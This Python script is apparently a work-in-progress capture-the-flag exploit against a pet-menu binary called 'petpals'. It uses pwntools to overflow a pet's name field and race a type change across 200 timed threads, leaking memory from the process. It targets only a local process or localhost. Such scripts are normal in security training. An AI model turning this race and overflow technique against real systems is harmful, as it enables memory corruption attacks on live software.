#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time
import threading

exe = ptr.ELF("./petpals_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main(offset):
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def r(size: int) -> bytes:
        return io.recv(size)

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    def create_or_update(animal_type: bytes, name: bytes, first_recv: bool = True):
        if first_recv:
            sla(b"> ", b"1")
        else:
            sl(b"1")
        sla(b"type: ", animal_type)
        sla(b"name: ", name)
        return

    def create_or_update_unrecv(animal_type: bytes, name: bytes):
        sl(b"1")
        sl(animal_type)
        sl(name)
        return

    def walk_together():
        sla(b"> ", b"2")
        return

    def walk_together_unrecv():
        sl(b"2")

    def rename(name: bytes):
        sla(b"> ", b"3")
        sla(b"name: ", name)
        return

    def quit():
        sla(b"> ", b"4")
        return

    # animal(0x10) lizard hamster:
    # 0 0x00 ~ 0x08: animal_type_idx
    # 1 0x08 ~ 0x10: name
    # 2 0x10 ~ 0x18: name
    # 3 0x18 ~ 0x20: length (0x10) (uint64_t)
    # 4 0x20 ~ 0x28: unknown_byte (0x64)

    # animal(0x20) dog cat:
    # 0 0x00 ~ 0x08: animal_type_idx
    # 1 0x08 ~ 0x10: name
    # 2 0x10 ~ 0x18: name
    # 3 0x18 ~ 0x20: name
    # 4 0x20 ~ 0x28: name
    # 5 0x28 ~ 0x30: length (0x20) (uint64_t)
    # 6 0x30 ~ 0x38: unknown_byte (0xc8)

    # &animal: 0x00007fffffffea00


    # offset = 0
    # while True:
    #     if offset == 0:
    #         create_or_update(b"dog", b"A" * 0x10 + b"\xff" * 8)
    #     else :
    #         create_or_update(b"dog", b"A" * 0x10 + b"\xff" * 8, first_recv = False)
    #     walk_together()
    #     time.sleep(4 - offset * 0.01)
    #     create_or_update(b"lizard", b"B" * 8)
    #     dump = ru(b"is returned")
    #     print(f"##########{str(4 - offset * 0.01)}##########")
    #     print(dump)
    #     offset += 1

    # def worker(offset):
    if offset == 0:
        create_or_update(b"dog", b"A" * 0x10 + b"\xff" * 8)
    else :
        create_or_update(b"dog", b"A" * 0x10 + b"\xff" * 8, first_recv = False)
    walk_together()
    time.sleep(4.1 - offset * 0.01)
    create_or_update(b"lizard", b"B" * 8)
    dump = ru(b"is returned")
    print(f"##########{str(4 - offset * 0.01)}##########")
    print(dump)

    print(offset)
    io.close()
    return



if __name__ == "__main__":
    # for i in range(1):
    threads = []
    for offset in range(100 * 2):  # 0.00 ~ 0.99 秒ずらして 100通り試す
        t = threading.Thread(target=main, args=(offset,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
        time.sleep(0.5)

    print("hello")
